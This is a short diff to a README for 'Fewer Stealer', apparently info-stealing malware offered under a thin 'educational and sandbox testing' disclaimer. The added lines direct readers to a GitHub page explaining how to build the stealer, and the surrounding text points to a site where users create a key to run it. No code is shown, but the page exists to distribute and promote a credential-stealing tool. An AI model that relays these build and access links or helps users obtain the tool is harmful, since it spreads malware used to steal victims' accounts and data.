@@ -5,6 +5,10 @@
     <strong>Disclaimer:</strong> This software is intended for personal educational and sandbox testing purposes only. We are not responsible for any damages that may occur as a result of its usage. Use it at your own risk.
 </p>
 
+## HOW TO BUILD FEWER ?
+READ PLEASE : https://github.com/paralox399/fewerstealer/tree/main/Fewer%20Stealer%20Github%20v3#readme 
+
+
 ## 📝 Key System
 
 ### To use Fewer Stealer, you need to create a key at https://buildandwatch.net/createkey
